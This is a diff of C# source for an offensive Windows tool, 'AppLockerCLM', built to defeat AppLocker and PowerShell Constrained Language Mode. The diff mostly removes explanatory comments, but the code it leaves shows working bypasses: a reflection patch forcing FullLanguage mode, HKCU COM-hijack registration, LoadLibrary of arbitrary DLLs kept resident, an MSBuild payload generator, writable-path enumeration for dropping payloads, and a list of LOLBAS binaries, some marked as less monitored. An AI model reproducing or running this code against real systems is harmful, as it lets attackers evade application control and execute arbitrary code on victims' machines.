@@ -12,29 +12,6 @@ using System.Text;
 using System.Xml;
 using Microsoft.Win32;
 
-// AppLockerCLM - AppLocker Recon & PowerShell Constrained Language Mode Bypass Tool
-//
-// BYPASS STRATEGY:
-//   When this .NET executable is allowed by AppLocker (e.g., placed in a whitelisted
-//   path or signed), it can host the PowerShell runtime in-process.  An in-process
-//   runspace created via RunspaceFactory is NOT subject to CLM enforcement the same
-//   way that powershell.exe is — AppLocker enforces CLM on the powershell.exe host
-//   process, but a custom .NET host that directly creates a Runspace can set
-//   InitialSessionState.LanguageMode = FullLanguage and additionally patch the
-//   ExecutionContext._languageMode field via reflection to force Full Language Mode
-//   regardless of what AppLocker/SRP policies are in place.
-//
-// COMMANDS:
-//   (none)                     Auto detect: CLM status, AppLocker policy, writable paths, LOLBAS
-//   check                      Detailed policy analysis (rules, wildcards, writable paths)
-//   shell                      Interactive PowerShell in Full Language Mode
-//   exec <cmd>                 Run a single PS command in Full Language Mode
-//   script <path.ps1>          Run a script file in Full Language Mode
-//   msbuild <out.csproj> [cmd] Generate an MSBuild .csproj bypass payload
-//   writable                   Enumerate writable directories in AppLocker allowed paths
-//   lolbas                     List available LOLBAS binaries
-//   help                       Show help
-
 namespace AppLockerCLM
 {
     class Program
@@ -128,22 +105,17 @@ namespace AppLockerCLM
                         LoadDll(args[1]);
                         break;
 
-                    // ---- COM Hijack Bypass ----
-
                     case "comsetup":
-                        // comsetup <dll_path> [ProgID]
                         if (args.Length < 2) { Err("Usage: comsetup <dll_path> [ProgID]"); return; }
                         SetupComHijack(args[1], args.Length > 2 ? args[2] : null);
                         break;
 
                     case "comload":
-                        // comload <ProgID_or_{GUID}>
                         if (args.Length < 2) { Err("Usage: comload <ProgID_or_{GUID}>"); return; }
                         LoadComObject(args[1]);
                         break;
 
                     case "comclean":
-                        // comclean <{GUID}_or_ProgID>
                         if (args.Length < 2) { Err("Usage: comclean <{GUID}_or_ProgID>"); return; }
                         CleanComHijack(args[1]);
                         break;
@@ -161,8 +133,6 @@ namespace AppLockerCLM
                         break;
 
                     default:
-                        // If the first arg looks like an unknown flag (starts with - or /)
-                        // show help instead of trying to execute it as a PS command.
                         if (args[0].StartsWith("-") || args[0].StartsWith("/"))
                         {
                             Err("Unknown option: " + args[0]);
@@ -171,7 +141,6 @@ namespace AppLockerCLM
                         }
                         else
                         {
-                            // Treat as a bare PS command: AppLockerCLM.exe Get-Process
                             RunCommand(string.Join(" ", args));
                         }
                         break;
@@ -183,19 +152,12 @@ namespace AppLockerCLM
             }
         }
 
-        // -------------------------------------------------------------------------
-        // Output helpers
-        // -------------------------------------------------------------------------
-
         static void Info(string msg) { if (!_quiet) Console.WriteLine("[*] " + msg); }
         static void Good(string msg) { Console.WriteLine("[+] " + msg); }
         static void Warn(string msg) { Console.WriteLine("[!] " + msg); }
         static void Err(string msg)  { Console.WriteLine("[X] " + msg); }
         static void Line()           { if (!_quiet) Console.WriteLine(); }
 
-        // -------------------------------------------------------------------------
-        // Banner / Help
-        // -------------------------------------------------------------------------
 
         static void Banner()
         {
@@ -263,10 +225,6 @@ EXAMPLES:
 ");
         }
 
-        // -------------------------------------------------------------------------
-        // Auto-detect
-        // -------------------------------------------------------------------------
-
         static void AutoDetect()
         {
             Info("Running auto-detection...\n");
@@ -313,7 +271,6 @@ EXAMPLES:
             CheckComHijackAvailability();
             Line();
 
-            // Summary
             if (clm || policy.HasPolicy)
             {
                 Good("=== BYPASS RECOMMENDATIONS ===");
@@ -331,13 +288,8 @@ EXAMPLES:
             }
         }
 
-        // -------------------------------------------------------------------------
-        // CLM Detection
-        // -------------------------------------------------------------------------
-
         static bool DetectCLM()
         {
-            // 1. Check __PSLockdownPolicy env var (set by WLDP/SRP when locking down PS)
             string envLockdown = Environment.GetEnvironmentVariable("__PSLockdownPolicy");
             if (!string.IsNullOrEmpty(envLockdown))
             {
@@ -349,8 +301,6 @@ EXAMPLES:
                     return true;
                 }
             }
-
-            // 2. Check if AppLocker is active with a policy — that implies CLM
             bool svcRunning = IsAppLockerServiceRunning();
             var policy = ReadAppLockerRegistry();
             if (svcRunning && policy.HasPolicy)
@@ -359,8 +309,6 @@ EXAMPLES:
                 Good("This tool bypasses CLM via in-process runspace hosting");
                 return true;
             }
-
-            // 3. Probe our own hosted runspace language mode (should be FullLanguage after bypass)
             try
             {
                 InitRunspace();
@@ -388,19 +336,14 @@ EXAMPLES:
             return false;
         }
 
-        // -------------------------------------------------------------------------
-        // AppLocker Registry Reading
-        // -------------------------------------------------------------------------
 
         static AppLockerPolicy ReadAppLockerRegistry()
         {
             var policy = new AppLockerPolicy();
 
-            // Primary GPO-applied policy location
             ReadSrpV2(Registry.LocalMachine,
                 @"SOFTWARE\Policies\Microsoft\Windows\SrpV2", policy);
 
-            // Also check GP objects cache
             try
             {
                 using (var gpBase = Registry.LocalMachine.OpenSubKey(
@@ -437,7 +380,6 @@ EXAMPLES:
 
         static void ReadRuleCollections(RegistryKey srpKey, AppLockerPolicy policy)
         {
-            // AppLocker rule collection subkeys
             string[] collections = { "Exe", "Script", "Dll", "Appx", "Msi" };
 
             foreach (string col in collections)
@@ -448,7 +390,6 @@ EXAMPLES:
                     {
                         if (colKey == null) continue;
 
-                        // EnforcementMode: 0=NotConfigured, 1=Enforce, 2=AuditOnly
                         string em = colKey.GetValue("EnforcementMode") as string ?? "";
                         bool enforced = em == "1";
 
@@ -459,7 +400,6 @@ EXAMPLES:
                                 using (var ruleKey = colKey.OpenSubKey(ruleGuid))
                                 {
                                     if (ruleKey == null) continue;
-                                    // AppLocker stores rule XML in a named value "Value", not the default value ""
                                     string xml = ruleKey.GetValue("Value") as string
                                               ?? ruleKey.GetValue("") as string;
                                     if (string.IsNullOrEmpty(xml)) continue;
@@ -495,9 +435,9 @@ EXAMPLES:
                     Enforced   = enforced,
                     Id         = root.GetAttribute("Id"),
                     Name       = root.GetAttribute("Name"),
-                    Action     = root.GetAttribute("Action"),     // Allow | Deny
+                    Action     = root.GetAttribute("Action"),     
                     UserSid    = root.GetAttribute("UserOrGroupSid"),
-                    RuleType   = root.Name  // FilePathRule | FilePublisherRule | FileHashRule
+                    RuleType   = root.Name 
                 };
 
                 var conditions = root.SelectNodes("Conditions/*");
@@ -523,10 +463,6 @@ EXAMPLES:
             }
             catch { return null; }
         }
-
-        // -------------------------------------------------------------------------
-        // AppLocker Analysis
-        // -------------------------------------------------------------------------
 
         static void DisplayPolicySummary(AppLockerPolicy policy)
         {
@@ -613,15 +549,8 @@ EXAMPLES:
             FindLolbas();
         }
 
-        // -------------------------------------------------------------------------
-        // Wildcard Rule Detection
-        // -------------------------------------------------------------------------
-
         static void FindWildcardRules(AppLockerPolicy policy)
         {
-            // "Loose" = path wildcard not anchored to a trusted root.
-            // e.g.  *\App-V\*  allows execution from ANY directory named App-V
-            //       C:\Users\*\Downloads\*  allows user-writable Downloads folders
 
             bool found = false;
             foreach (var rule in policy.Rules.Where(r => r.Action == "Allow" && r.RuleType == "FilePathRule"))
@@ -647,8 +576,6 @@ EXAMPLES:
         {
             reason = "";
             if (string.IsNullOrEmpty(path)) return false;
-
-            // Anchored to trusted system roots — these are NOT exploitable via wildcards
             string[] trustedRoots =
             {
                 "%WINDIR%", "%PROGRAMFILES%", "%PROGRAMFILES(X86)%",
@@ -659,15 +586,12 @@ EXAMPLES:
             string upper = path.ToUpperInvariant();
             foreach (var root in trustedRoots)
                 if (upper.StartsWith(root.ToUpperInvariant())) return false;
-
-            // Starts with * — matches any path containing the folder name
             if (path.StartsWith("*"))
             {
                 reason = "Path starts with '*' — matches any drive/directory prefix";
                 return true;
             }
 
-            // Starts with %USERPROFILE%, %APPDATA%, %LOCALAPPDATA%, %TEMP%, %TMP% — user writable
             string[] userRoots = { "%USERPROFILE%", "%APPDATA%", "%LOCALAPPDATA%", "%TEMP%", "%TMP%", "%HOMEPATH%" };
             foreach (var ur in userRoots)
             {
@@ -678,7 +602,6 @@ EXAMPLES:
                 }
             }
 
-            // Unrecognised environment variable prefix — unknown trust level
             if (path.StartsWith("%") && path.IndexOf('%', 1) > 1)
             {
                 string varName = path.Substring(1, path.IndexOf('%', 1) - 1);
@@ -693,9 +616,7 @@ EXAMPLES:
             return false;
         }
 
-        // -------------------------------------------------------------------------
-        // Writable Path Enumeration
-        // -------------------------------------------------------------------------
+
 
         static void FindWritablePathsCmd()
         {
@@ -709,7 +630,7 @@ EXAMPLES:
 
             if (policy.HasPolicy)
             {
-                // Pull directories from all Allow path rules
+
                 foreach (var rule in policy.Rules.Where(r => r.Action == "Allow" && r.RuleType == "FilePathRule"))
                 {
                     foreach (var p in rule.Paths)
@@ -722,8 +643,6 @@ EXAMPLES:
                 }
             }
 
-            // Always include the well-known writable Windows paths — relevant even with AppLocker
-            // because they often fall inside %WINDIR%\* allow rules
             candidates.AddRange(new[]
             {
                 @"C:\Windows\Tasks",
@@ -756,7 +675,6 @@ EXAMPLES:
                         found++;
                     }
 
-                    // Check one level of subdirectories
                     foreach (string sub in Directory.GetDirectories(path).Take(15))
                     {
                         try
@@ -781,7 +699,6 @@ EXAMPLES:
 
         static void PrintCommonWritablePaths()
         {
-            // Convenience: show writable status for common Windows paths
             var paths = new[]
             {
                 @"C:\Windows\Tasks", @"C:\Windows\Temp", @"C:\Windows\tracing",
@@ -803,8 +720,6 @@ EXAMPLES:
 
         static string ExpandAppLockerPath(string path)
         {
-            // AppLocker uses %OSDRIVE% which is NOT a real Windows environment variable.
-            // Map it and other AppLocker-specific macros before calling ExpandEnvironmentVariables.
             path = path.Replace("%OSDRIVE%",       Environment.GetEnvironmentVariable("SystemDrive") ?? "C:");
             path = path.Replace("%WINDIR%",        Environment.GetEnvironmentVariable("SystemRoot")  ?? @"C:\Windows");
             path = path.Replace("%SYSTEM32%",      Environment.GetFolderPath(Environment.SpecialFolder.System));
@@ -816,11 +731,9 @@ EXAMPLES:
             if (string.IsNullOrEmpty(path)) return null;
             path = path.TrimEnd('\\', '/');
 
-            // Remove trailing wildcard file patterns: C:\Windows\*  or  C:\Windows\*.exe
             while (!string.IsNullOrEmpty(path) && (path.EndsWith("*") || path.EndsWith("?")))
                 path = Path.GetDirectoryName(path)?.TrimEnd('\\', '/') ?? "";
 
-            // If the filename portion contains a wildcard, take the directory
             string fn = Path.GetFileName(path);
             if (!string.IsNullOrEmpty(fn) && (fn.Contains("*") || fn.Contains("?")))
                 path = Path.GetDirectoryName(path) ?? "";
@@ -852,8 +765,7 @@ EXAMPLES:
         {
             try
             {
-                // Must be able to list the directory — write-only dirs (e.g. C:\Windows\System32\Tasks)
-                // allow file creation but deny listing, making them impractical for dropping payloads
+
                 Directory.GetFiles(dir);
 
                 string tmp = Path.Combine(dir, Guid.NewGuid().ToString("N") + ".tmp");
@@ -863,15 +775,11 @@ EXAMPLES:
             catch { return false; }
         }
 
-        // -------------------------------------------------------------------------
-        // LOLBAS Enumeration
-        // -------------------------------------------------------------------------
 
         static void FindLolbas()
         {
             var lolbas = new Dictionary<string, string>
             {
-                // .NET / MSBuild — primary AppLocker bypass vectors
                 { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
                     "Compile & run inline C# via .csproj  [x86]" },
                 { @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
@@ -892,7 +800,6 @@ EXAMPLES:
                     "Compile C# source to EXE/DLL         [x86]" },
                 { @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                     "Compile C# source to EXE/DLL         [x64]" },
-                // System binaries
                 { @"C:\Windows\System32\mshta.exe",
                     "Execute HTA, VBScript, JScript" },
                 { @"C:\Windows\System32\certutil.exe",
@@ -926,17 +833,11 @@ EXAMPLES:
                 { @"C:\Windows\System32\xwizard.exe",
                     "Load COM objects via XML wizard" },
 
-                // Script hosts — run VBScript/JScript OUTSIDE PowerShell's language mode
-                // entirely. CLM does not apply. Can call COM objects via CreateObject().
                 { @"C:\Windows\System32\wscript.exe",
                     "Execute VBScript/JScript — bypasses CLM entirely (no PS language mode)" },
                 { @"C:\Windows\System32\cscript.exe",
                     "Execute VBScript/JScript (console) — bypasses CLM entirely" },
 
-                // Microsoft.Workflow.Compiler — same capability as MSBuild CodeTaskFactory
-                // (compiles + executes arbitrary C#) but far less commonly monitored.
-                // Lives in %WINDIR%\Microsoft.NET\Framework[64] — always AppLocker-allowed.
-                // Usage: Microsoft.Workflow.Compiler.exe payload.xoml payload.rules
                 { @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe",
                     "Compile & run arbitrary C# from XOML file — less monitored than MSBuild [x64]" },
                 { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe",
@@ -964,19 +865,6 @@ EXAMPLES:
             }
         }
 
-        // -------------------------------------------------------------------------
-        // -------------------------------------------------------------------------
-        // LoadDll — load a pre-compiled DLL directly into this process
-        //
-        // Advantage over comsetup/comload:
-        //   No registry touches, no child process, one command.
-        //   DllMain(DLL_PROCESS_ATTACH) fires immediately inside our process.
-        //   AppLocker DLL rules are off by default — DLL loads unrestricted.
-        //
-        // Advantage over rundll32:
-        //   rundll32 spawns a new process (AppLocker EXE check applies to that process).
-        //   LoadLibrary runs inside our already-trusted process — no new process created.
-        // -------------------------------------------------------------------------
 
         static void LoadDll(string dllPath)
         {
@@ -998,7 +886,6 @@ EXAMPLES:
                 int err = Marshal.GetLastWin32Error();
                 Err(string.Format("LoadLibrary failed — Win32 error {0}", err));
 
-                // Common error codes to help diagnose
                 switch (err)
                 {
                     case 2:   Err("ERROR_FILE_NOT_FOUND — DLL or a dependency not found"); break;
@@ -1012,20 +899,12 @@ EXAMPLES:
             Good(string.Format("DLL loaded at 0x{0:X}", hModule.ToInt64()));
             Good("DllMain(DLL_PROCESS_ATTACH) executed — payload is running");
             Line();
-            // Do NOT call FreeLibrary — keeps DLL and any spawned threads resident
             Info("DLL kept resident (FreeLibrary skipped — payload threads stay alive)");
             Info("Handle: 0x" + hModule.ToString("X"));
         }
 
-        // -------------------------------------------------------------------------
-        // MSBuild Payload Generator
-        // -------------------------------------------------------------------------
-
         static void GenerateMSBuildPayload(string outputPath, string command)
         {
-            // command is guaranteed non-empty by the caller (prompted interactively if not passed)
-            // Escape the command for embedding inside a C# double-quoted string literal.
-            // The resulting text goes inside  AddScript("...here...")  in the payload.
             string escapedCmd = command
                 .Replace("\\", "\\\\")
                 .Replace("\"", "\\\"")
@@ -1034,8 +913,6 @@ EXAMPLES:
 
             string fileName = Path.GetFileName(outputPath);
 
-            // Build the payload C# code using a StringBuilder so we never have to worry
-            // about nested verbatim-string quoting interactions with the outer C# file.
             var code = new StringBuilder();
             code.AppendLine("using Microsoft.Build.Utilities;");
             code.AppendLine("using System;");
@@ -1080,7 +957,6 @@ EXAMPLES:
             code.AppendLine("        return true;");
             code.AppendLine("    }");
             code.AppendLine();
-            // Reflection helper — forces FullLanguage on ExecutionContext._languageMode
             code.AppendLine("    static void ForceFullLanguage(Runspace rs)");
             code.AppendLine("    {");
             code.AppendLine("        try");
@@ -1111,7 +987,6 @@ EXAMPLES:
             code.AppendLine("    }");
             code.AppendLine("}");
 
-            // Build the complete .csproj XML
             var xml = new StringBuilder();
             xml.AppendLine("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
             xml.AppendLine("<!--");
@@ -1164,16 +1039,6 @@ EXAMPLES:
             }
         }
 
-        // -------------------------------------------------------------------------
-        // PowerShell Execution — CLM Bypass via In-Process Runspace Hosting
-        //
-        // Key technique: we are a .NET executable, not powershell.exe.
-        // AppLocker's CLM enforcement targets the powershell.exe host process.
-        // By hosting the PS runtime ourselves and setting LanguageMode = FullLanguage
-        // at the InitialSessionState level, plus patching ExecutionContext._languageMode
-        // via reflection, we execute arbitrary PS in Full Language Mode regardless of
-        // what AppLocker or SRP policies are configured on this machine.
-        // -------------------------------------------------------------------------
 
         static void InitRunspace()
         {
@@ -1182,18 +1047,14 @@ EXAMPLES:
 
             CleanupRunspace();
 
-            // Step 1: Set LanguageMode = FullLanguage in InitialSessionState
             var iss = InitialSessionState.CreateDefault();
             iss.LanguageMode = PSLanguageMode.FullLanguage;
 
             _runspace = RunspaceFactory.CreateRunspace(iss);
             _runspace.Open();
 
-            // Step 2: Force FullLanguage via reflection on ExecutionContext._languageMode
-            // This handles environments where PS re-applies CLM after runspace open
             ForceFullLanguageMode(_runspace);
 
-            // Step 3: Bypass execution policy for this process
             try
             {
                 using (var pipe = _runspace.CreatePipeline())
@@ -1209,9 +1070,7 @@ EXAMPLES:
 
         static void ForceFullLanguageMode(Runspace rs)
         {
-            // Walk the inheritance chain of the concrete Runspace type (LocalRunspace)
-            // looking for a field that holds an instance of ExecutionContext (internal type).
-            // When found, set its _languageMode field to FullLanguage.
+
             try
             {
                 var bf = BindingFlags.NonPublic | BindingFlags.Instance;
@@ -1228,7 +1087,6 @@ EXAMPLES:
 
                             if (val.GetType().Name == "ExecutionContext")
                             {
-                                // Try direct field first
                                 var lmField = val.GetType().GetField("_languageMode", bf);
                                 if (lmField != null)
                                 {
@@ -1236,7 +1094,6 @@ EXAMPLES:
                                     return;
                                 }
 
-                                // Fallback: try property
                                 var lmProp = val.GetType().GetProperty("LanguageMode",
                                     bf | BindingFlags.Public);
                                 if (lmProp != null && lmProp.CanWrite)
@@ -1298,7 +1155,6 @@ EXAMPLES:
             {
                 InitRunspace();
 
-                // Verify the language mode we got
                 string mode = "Unknown";
                 using (var pipe = _runspace.CreatePipeline())
                 {
@@ -1335,28 +1191,12 @@ EXAMPLES:
             }
         }
 
-        // -------------------------------------------------------------------------
-        // COM Hijack Bypass
-        //
-        // Why it works:
-        //   - Registration in HKCU\Software\Classes\CLSID requires NO admin rights.
-        //   - "New-Object -ComObject" is on the CLM safe-cmdlet whitelist — allowed
-        //     in ConstrainedLanguage mode.
-        //   - When CoCreateInstance loads the InprocServer32 DLL into powershell.exe,
-        //     DllMain(DLL_PROCESS_ATTACH) runs arbitrary code inside the trusted process.
-        //   - AppLocker DLL rules are disabled by default (performance cost means they
-        //     are rarely deployed), so the DLL itself is not blocked.
-        // -------------------------------------------------------------------------
-
         static void CheckComHijackAvailability()
         {
-            // New-Object -ComObject is always available in CLM — it's whitelisted
             Good("New-Object -ComObject is allowed in CLM (whitelisted cmdlet)");
 
-            // HKCU\Software\Classes is always writable — no admin required
             Good("HKCU\\Software\\Classes is writable (no admin required)");
 
-            // Check if AppLocker DLL rules are active
             var policy = ReadAppLockerRegistry();
             bool dllRulesActive = policy.HasPolicy &&
                                   policy.Rules.Any(r => r.Collection == "Dll" && r.Enforced);
@@ -1374,26 +1214,21 @@ EXAMPLES:
 
             if (string.IsNullOrEmpty(progId))
                 progId = "AppLocker.Bypass." + Guid.NewGuid().ToString("N").Substring(0, 8);
-
-            // HKCU\Software\Classes\CLSID\{GUID}
             string clsidBase = @"Software\Classes\CLSID\" + guid;
             try
             {
                 using (var k = Registry.CurrentUser.CreateSubKey(clsidBase))
                     k.SetValue("", "COM Hijack");
 
-                // HKCU\Software\Classes\CLSID\{GUID}\InprocServer32
                 using (var k = Registry.CurrentUser.CreateSubKey(clsidBase + @"\InprocServer32"))
                 {
                     k.SetValue("", dllPath);
                     k.SetValue("ThreadingModel", "Both");
                 }
 
-                // HKCU\Software\Classes\{ProgID}
                 using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\" + progId))
                     k.SetValue("", "COM Hijack");
 
-                // HKCU\Software\Classes\{ProgID}\CLSID
                 using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\" + progId + @"\CLSID"))
                     k.SetValue("", guid);
 
@@ -1433,19 +1268,13 @@ EXAMPLES:
 
             InitRunspace();
 
-            // Build the load expression.
-            // Both forms work in CLM:
-            //   New-Object -ComObject ProgID            (ProgID lookup -> CLSID -> InprocServer32)
-            //   [Activator]::CreateInstance(...)        (direct CLSID, but [Activator] may be blocked in CLM)
-            // New-Object -ComObject is the safest for CLM.
             string script;
             bool isGuid = progIdOrGuid.StartsWith("{") ||
                           (progIdOrGuid.Length == 36 && progIdOrGuid.Contains("-"));
 
             if (isGuid)
             {
-                // Use Activator for GUID-only (no ProgID registered)
-                // This may not work in CLM — prefer registering a ProgID with comsetup
+
                 string rawGuid = progIdOrGuid.Trim('{', '}');
                 script = "[activator]::CreateInstance([type]::GetTypeFromCLSID([System.Guid]\"" + rawGuid + "\"))";
                 Warn("Using Activator::CreateInstance — may be restricted in CLM.");
@@ -1453,7 +1282,6 @@ EXAMPLES:
             }
             else
             {
-                // New-Object -ComObject is whitelisted in CLM
                 script = "$null = New-Object -ComObject " + progIdOrGuid +
                          " -ErrorAction SilentlyContinue; 'Loaded'";
             }
@@ -1467,8 +1295,7 @@ EXAMPLES:
 
                     if (pipe.Error.Count > 0)
                     {
-                        // Errors here are normal — the DLL may not implement IDispatch,
-                        // but DllMain still fired on DLL_PROCESS_ATTACH
+
                         foreach (var e in pipe.Error.ReadToEnd())
                             Info("COM error (expected if DLL has no dispatch interface): " + e);
                     }
@@ -1479,8 +1306,7 @@ EXAMPLES:
             }
             catch (Exception ex)
             {
-                // Exception from COM instantiation is expected if the DLL doesn't
-                // implement a proper COM interface — the payload in DllMain already ran
+
                 Info("COM exception (payload likely ran): " + ex.Message);
                 Good("DllMain(DLL_PROCESS_ATTACH) fires before COM interface is checked");
             }
@@ -1490,7 +1316,6 @@ EXAMPLES:
         {
             int removed = 0;
 
-            // Try as CLSID GUID
             if (guidOrProgId.StartsWith("{") || CouldBeGuid(guidOrProgId))
             {
                 string guid = guidOrProgId.StartsWith("{")
@@ -1507,7 +1332,6 @@ EXAMPLES:
                 catch { }
             }
 
-            // Try as ProgID
             string progIdPath = @"Software\Classes\" + guidOrProgId;
             try
             {
@@ -1575,7 +1399,6 @@ EXAMPLES:
 
         static string FindProgIdForClsid(string guid)
         {
-            // Reverse-lookup: scan HKCU\Software\Classes\{ProgID}\CLSID for matching GUID
             try
             {
                 using (var classesKey = Registry.CurrentUser.OpenSubKey(@"Software\Classes"))
@@ -1608,9 +1431,6 @@ EXAMPLES:
             return Guid.TryParse(s, out g);
         }
 
-        // -------------------------------------------------------------------------
-        // Utilities
-        // -------------------------------------------------------------------------
 
         static bool IsAppLockerServiceRunning()
         {
@@ -1642,10 +1462,6 @@ EXAMPLES:
         }
     }
 
-    // -------------------------------------------------------------------------
-    // Data Models
-    // -------------------------------------------------------------------------
-
     class AppLockerPolicy
     {
         public bool HasPolicy { get; set; }
@@ -1654,11 +1470,11 @@ EXAMPLES:
 
     class AppLockerRule
     {
-        public string Collection { get; set; }  // Exe | Script | Dll | Msi | Appx
-        public string RuleType   { get; set; }  // FilePathRule | FilePublisherRule | FileHashRule
+        public string Collection { get; set; }  
+        public string RuleType   { get; set; } 
         public string Id         { get; set; }
         public string Name       { get; set; }
-        public string Action     { get; set; }  // Allow | Deny
+        public string Action     { get; set; }  
         public string UserSid    { get; set; }
         public bool   Enforced   { get; set; }
         public List<string> Paths { get; } = new List<string>();
